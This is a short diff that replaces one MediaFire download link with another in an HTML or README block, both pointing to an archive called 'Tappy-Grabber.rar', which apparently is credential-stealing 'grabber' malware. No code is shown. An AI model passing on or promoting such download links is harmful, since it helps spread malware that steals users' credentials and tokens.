@@ -28,7 +28,7 @@
 
 
 <br>
-💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/626u1gxnfm9hk79/Tappy-Grabber.rar/file
+💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/rcx04wy7k9iqgtc/Tappy-Grabber.rar/file
 <br>
 <br>
 
